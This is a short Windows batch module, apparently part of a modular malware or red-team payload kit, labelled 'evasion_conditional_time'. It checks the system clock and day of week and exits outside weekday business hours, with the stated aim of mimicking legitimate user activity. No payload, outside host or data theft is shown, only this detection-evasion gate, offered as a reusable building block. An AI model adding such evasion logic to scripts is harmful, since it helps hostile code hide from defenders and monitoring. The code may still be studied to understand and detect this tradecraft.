REM provides: evasion_conditional_time
REM depends: (none)
REM description: Only execute during business hours to mimic legitimate user activity

REM Extract current hour (handle leading space for single-digit hours)
for /f "tokens=1 delims=:" %%h in ("%TIME: =0%") do set /a "HOUR=%%h"

REM Skip execution outside business hours (08:00 - 18:00)
if %HOUR% LSS 8 exit /b 0
if %HOUR% GTR 18 exit /b 0

REM Also check day of week (skip weekends)
for /f "tokens=1" %%d in ('wmic path Win32_LocalTime get DayOfWeek /value 2^>nul ^| findstr "="') do (
    for /f "tokens=2 delims==" %%v in ("%%d") do set /a "DOW=%%v"
)

REM 0=Sunday, 6=Saturday
if defined DOW (
    if %DOW%==0 exit /b 0
    if %DOW%==6 exit /b 0
)
